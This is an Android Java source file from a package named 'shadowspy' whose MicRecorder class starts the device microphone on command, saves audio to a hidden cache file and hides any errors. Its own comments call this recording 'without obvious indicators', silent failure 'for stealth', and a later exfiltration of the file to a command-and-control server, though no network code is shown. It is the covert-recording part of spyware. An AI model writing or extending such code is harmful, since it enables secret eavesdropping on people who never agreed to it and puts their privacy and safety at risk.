package com.shadowspy;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;

// On-demand mic recording without obvious indicators
public class MicRecorder {
    private MediaRecorder recorder;
    private String outputFile;

    public void startRecording(Context context, int durationSeconds) {
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            outputFile = context.getExternalCacheDir() + "/shadow_mic_" + System.currentTimeMillis() + ".mp4";
            recorder.setOutputFile(outputFile);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.prepare();
            recorder.start();
            // Auto stop after duration, exfil file via C2
            new android.os.Handler().postDelayed(this::stopRecording, durationSeconds * 1000);
        } catch (Exception e) {
            // Silent fail for stealth
        }
    }

    private void stopRecording() {
        if (recorder != null) {
            recorder.stop();
            recorder.release();
            // Exfil outputFile to C2
        }
    }
}